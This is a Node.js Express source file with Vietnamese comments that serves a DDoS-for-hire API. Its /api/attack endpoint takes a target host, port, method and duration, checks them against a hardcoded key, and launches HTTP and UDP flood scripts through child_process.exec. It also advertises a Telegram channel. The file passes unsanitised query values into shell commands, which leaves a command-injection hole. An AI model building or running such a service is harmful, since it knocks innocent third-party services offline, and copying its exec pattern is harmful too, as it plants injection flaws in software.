const express = require("express");
const app = express();
const port = 9998;
var exec = require("child_process").exec;

let activeAttacks = 0; // Biến đếm số cuộc tấn công đang diễn ra
const maxConcurrentAttacks = 3; // Giới hạn số cuộc tấn công đang thực hiện đồng thời

app.get("/api/attack", (req, res) => {
  const clientIP =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const { key, host, time, method, port } = req.query;
  console.log(`IP Connect: ${clientIP}`);

  // Kiểm tra các thông tin đầu vào
  if (!key || !host || !time || !method || !port) {
    const err_u = {
      status: `error`,
      message: `Server url API : /api/attack?key=EnterYouKey&host={host}&port={port}&method={method}&time={time}`,
    };
    return res.status(400).send(err_u);
  }

  if (key !== "duong") {
    const err_key = {
      status: `error`,
      message: `Error Keys`,
    };
    return res.status(400).send(err_key);
  }

  if (time > 201) {
    const err_time = {
      status: `error`,
      message: `Error Time < 200 Second`,
    };
    return res.status(400).send(err_time);
  }

  if (port > 65535 || port < 1) {
    const err_port = {
      status: `error`,
      message: `Error Port`,
    };
    return res.status(400).send(err_port);
  }

  if (
    !(
      method.toLowerCase() === "rapid" ||
      method.toLowerCase() === "flood" ||
      method.toLowerCase() === "king-udp" ||
      method.toLowerCase() === "http-load" // Thêm phương thức http-load
    )
  ) {
    const err_method = {
      status: `error`,
      method_valid: `Error Methods`,
      info: `https://t.me/ThaiDuongScript`,
    };
    return res.status(400).send(err_method);
  }

  // Kiểm tra số lượng cuộc tấn công đang hoạt động
  if (activeAttacks >= maxConcurrentAttacks) {
    const err_attack_limit = {
      status: `error`,
      message: `Maximum number of concurrent attacks reached. Please try again later.`,
    };
    return res.status(400).send(err_attack_limit);
  }

  // Tăng số lượng cuộc tấn công đang diễn ra
  activeAttacks++;

  // Trả về thông báo tấn công thành công
  const jsonData = {
    status: `success`,
    message: `Send Attack Successful 1/1`,
    host: `${host}`,
    port: `${port}`,
    time: `${time}`,
    method: `${method}`,
  };
  res.status(200).send(jsonData);

  // Xử lý lệnh tấn công và giảm số lượng cuộc tấn công sau khi hoàn thành
  const executeCommand = (command, callback) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
      }
      console.log(`[${clientIP}] Command [${method}] executed successfully`);

      // Giảm số lượng cuộc tấn công sau khi lệnh hoàn thành
      activeAttacks--;
      callback();
    });
  };

  if (method.toLowerCase() === "rapid") {
    executeCommand(`node floodbypass ${host} ${time} 5 3 http.txt rand`, 
    () => {}
    );
  }

  if (method.toLowerCase() === "flood") {
    executeCommand(
      `node bestflood ${host} ${time} 5 3 http.txt`,
      () => {}
    );
  }

  if (method.toLowerCase() === "king-udp") {
    executeCommand(`node udp.js ${host} ${port} ${time}`, () => {});
  }

  if (method.toLowerCase() === "http-load") {
    executeCommand(`node flood ${host} ${time} 32 10 flood.txt`, () => {}); // Thêm lệnh http-load
  }
});

app.listen(port, () => {
  console.log(`[API SERVER] running on http://localhost:${port}`);
});
